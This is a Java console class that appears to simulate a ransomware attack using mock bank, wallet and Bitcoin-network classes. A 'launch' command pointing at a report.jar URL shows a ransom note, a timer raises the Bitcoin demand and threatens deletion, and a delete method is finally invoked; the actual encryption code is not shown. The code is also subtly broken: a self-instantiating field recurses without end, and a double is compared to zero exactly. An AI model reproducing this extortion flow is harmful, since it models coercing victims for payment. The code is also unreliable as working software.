package Console.Console;

import Bitcoin.BitcoinNetwork;
import Bitcoin.Wallet;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.Timer;
import java.util.TimerTask;


public class Commands {
    private static boolean running=true;
    private Object reportPort;
    private Bank bank=new Bank();
    private boolean state=false;
    public Commands() throws NoSuchMethodException {
        reportPort= Reportfactory.build();
    }
    Commands commands=new Commands();
    private Wallet wallet=new Wallet();
    private Wallet ed=new Wallet();
    private BitcoinNetwork bitcoinNetwork=new BitcoinNetwork();
    private double amounttopay=0.02755;
    private int time=0;

    public static boolean getRunning(){return running;}

    public void listen() throws Exception{
        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
        String input=in.readLine();
        String[] result=input.split(" ");
        Timer timer=new Timer();
        if(state==false){
            if(input.equals("launch http://www.trust-me.mcg/report.jar")){
                Method init=reportPort.getClass().getDeclaredMethod("init");
                init.invoke(reportPort);
                System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
                state=true;
            }
        }
        if(state==true){
            if(result[0].equals("exchange")){
                double coins=Double.parseDouble(result[1]);
                bank.pay(coins);
                bitcoinNetwork.buyBitcoin(wallet.getPublicKey(),coins);
            }
            if(input.equals("show balance")){
                String amount= String.valueOf(wallet.getBalance());
                System.out.println(amount+" BTC");
                amount = String.valueOf(bank.getMoney());
                System.out.println(amount+ " €");
            }
            if(input.equals("show recipient")){
                System.out.println(ed.getPublicKey());
            }
            if(result[0].equals("pay")){
                double coins=Double.parseDouble((result[1]));
                bitcoinNetwork.addTransactionToBlockchain(wallet.sendFunds(ed.getPublicKey(), coins));
                amounttopay=amounttopay-coins;
            }
            if(result[0].equals("check")){
                Method end=reportPort.getClass().getDeclaredMethod("end");
                if(bitcoinNetwork.validateBlockchain()){
                    System.out.println("Transaction successfull");
                    if(amounttopay==0){
                        end.invoke(reportPort);
                        running=!running;
                        state=false;
                        timer.cancel();
                    }
                    else {
                        System.out.println("Not enough Bitcoin paid");
                    }
                }
            }
            timer.schedule(new TimerTask() {
                @Override
                public void run(){
                    time++;
                    switch (time){
                        case 4:
                            amounttopay=amounttopay+0.01;
                            System.out.println("Pay "+String.valueOf(amounttopay)+" BTC immediately or your files will be irrevocably deleted.");
                            break;
                        case 5:
                            Method delete= null;
                            try {
                                delete = reportPort.getClass().getDeclaredMethod("delete");
                                delete.invoke(reportPort);
                            } catch (Exception e) {
                                e.getMessage();
                            }
                            timer.cancel();
                            state=false;
                            running=!running;
                            break;
                        default:
                            amounttopay=amounttopay+0.01;
                            System.out.println("Amount to pay increased by 0.01 to "+String.valueOf(amounttopay)+" BTC");
                            break;
                    }
                }
            },0,60*1000);
        }
    };
}
